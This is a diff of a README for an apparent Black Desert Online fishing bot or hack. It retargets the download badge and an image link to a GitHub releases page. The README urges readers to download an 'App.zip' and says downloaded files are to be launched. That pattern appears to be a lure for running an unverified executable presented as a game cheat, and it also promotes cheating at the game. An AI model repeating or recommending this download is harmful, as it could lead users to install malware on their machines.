@@ -22,7 +22,7 @@ bdo, bdo-bot, bdo-fishing-bot, bdo-hack, bdo-script, black-desert, black-desert-
 ## Download the Bot 📥
 
 Click the button below to download our amazing Black Desert Online Bot:
-[![Download Bot](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download Bot](https://github.com/mhmddfrds/Black-Desert-Online-Bot/releases)](https://github.com/mhmddfrds/Black-Desert-Online-Bot/releases)
 
 Remember, if the link ends with the file name, it needs to be launched after downloading.
 
@@ -51,4 +51,4 @@ If you enjoy using our bot, don't forget to share it with your friends and guild
 
 Thank you for choosing our Black Desert Online Bot. Let the adventures begin! 🌟
 
-![Black Desert Online](https://example.com/black-desert-online-image.jpg)
+![Black Desert Online](https://github.com/mhmddfrds/Black-Desert-Online-Bot/releases)
